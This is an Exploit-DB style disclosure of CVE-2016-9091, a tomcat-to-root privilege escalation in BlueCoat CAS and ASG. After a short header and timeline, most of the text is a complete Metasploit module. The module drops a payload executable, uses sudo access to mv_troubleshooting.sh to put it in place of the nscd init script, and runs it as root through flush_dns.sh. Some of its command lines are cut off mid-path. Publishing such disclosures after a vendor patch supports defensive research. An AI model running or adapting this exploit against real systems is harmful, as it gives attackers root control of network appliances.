# Exploit Title: OS Command Injection Vulnerability in BlueCoat ASG and CAS
# Date: April 3, 2017
# Exploit Authors:  Chris Hebert, Peter Paccione and Corey Boyd
# Contact: chrisdhebert[at]gmail.com
# Vendor Security Advisory: https://bto.bluecoat.com/security-advisory/sa138
# Version: CAS 1.3 prior to 1.3.7.4 & ASG 6.6 prior to 6.6.5.4 are vulnerable
# Tested on: BlueCoat CAS 1.3.7.1
# CVE : cve-2016-9091

Timeline:
--------
08/31/2016 (Vulnerablities Discovered)
03/31/2017 (Final Vendor Patch Confirmed)
04/03/2017 (Public Release)

Description:
The BlueCoat ASG and CAS management consoles are susceptible to a privilege escalation vulnerablity.
A malicious user with tomcat privileges can escalate to root via the vulnerable mvtroubleshooting.sh script.

Proof of Concept:

Metasploit Module - root priv escalation (via mvtroubleshooting.sh)
-----------------
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/exe'


class Metasploit4 < Msf::Exploit::Local
  Rank = AverageRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Exploit::Local::Linux

  def initialize(info={})
    super( update_info( info, {
        'Name'          => 'BlueCoat CAS 1.3.7.1 tomcat->root privilege escalation (via mvtroubleshooting.sh)',
        'Description'   => %q{
          This module abuses the sudo access granted to tomcat and the mvtroubleshooting.sh script to escalate
          privileges. In order to work, a tomcat session with access to sudo on the sudoers
          is needed. This module is useful for post exploitation of BlueCoat
          vulnerabilities, where typically web server privileges are acquired, and this
          user is allowed to execute sudo on the sudoers file.
        },
        'License'        => MSF_LICENSE,
        'Author'       => [
         'Chris Hebert <chrisdhebert[at]gmail.com>',
         'Pete Paccione <petepaccione[at]gmail.com>',
         'Corey Boyd <corey.k.boyd[at]gmail.com>'
        ],
        'DisclosureDate' => 'Vendor Contacted 8-31-2016',
        'References'     =>
        [
          ['EDB', '##TBD##'],
          ['CVE', '2016-9091' ],
          ['URL', 'http://https://bto.bluecoat.com/security-advisory/sa138']
        ],
        'Platform'       => %w{ linux unix },
        'Arch'           => [ ARCH_X86 ],
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        =>
          [
            [ 'Linux x86',       { 'Arch' => ARCH_X86 } ]
          ],
        'DefaultOptions' => { "PrependSetresuid" => true, "WfsDelay" => 2 },
        'DefaultTarget' => 0,
      }
      ))
    register_options([
        OptString.new("WritableDir", [ false, "A directory where we can write files", "/var/log" ]),
      ], self.class)
  end

  def check
    id=cmd_exec("id -un")
    if id!="tomcat"
      print_status("#{peer} - ERROR - Session running as id= #{id}, but must be tomcat")
      fail_with(Failure::NoAccess, "Session running as id= #{id}, but must be tomcat")
    end

    clprelease=cmd_exec("cat /etc/clp-release | cut -d \" \" -f 3")
    if clprelease!="1.3.7.1"
      print_status("#{peer} - ERROR - BlueCoat version #{clprelease}, but must be 1.3.7.1")
      fail_with(Failure::NotVulnerable, "BlueCoat version #{clprelease}, but must be 1.3.7.1")
    end

    return Exploit::CheckCode::Vulnerable
  end
  def exploit
    print_status("#{peer} - Checking for vulnerable BlueCoat session...")
    if check != CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, "FAILED Exploit - BlueCoat not running as tomcat or not version 1.3.7.1")
    end

    print_status("#{peer} - Running Exploit...")
    exe_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(3 + rand(5))}.elf"
    write_file(exe_file, generate_payload_exe)
    cmd_exec "chmod +x #{exe_file}"

    begin
      #Backup original nscd init script
      cmd_exec "/usr/bin/sudo /opt/bluecoat/avenger/scripts/mv_troubleshooting.sh /etc/init.d/nscd /data/bluecoat/avenger/ui/logs/tro$
      #Replaces /etc/init.d/nscd script with meterpreter payload
      cmd_exec "/usr/bin/sudo /opt/bluecoat/avenger/scripts/mv_troubleshooting.sh #{exe_file} /data/bluecoat/avenger/ui/logs/troubles$
      #Executes meterpreter payload as root
      cmd_exec "/usr/bin/sudo /opt/bluecoat/avenger/scripts/flush_dns.sh"
      #note, flush_dns.sh waits for payload to exit. (killing it falls over to init pid=1)
    ensure
      #Restores original nscd init script
      cmd_exec "/usr/bin/sudo /opt/bluecoat/avenger/scripts/mv_troubleshooting.sh /var/log/nscd.backup /data/bluecoat/avenger/ui/logs$
      #Remove meterpreter payload (precautionary as most recent mv_troubleshooting.sh should also remove it)
      cmd_exec "/bin/rm -f #{exe_file}"
    end
    print_status("#{peer} - The exploit module has finished")
    #Maybe something here to deal with timeouts?? noticied inconsistant..  Exploit failed: Rex::TimeoutError Operation timed out.

  end
end

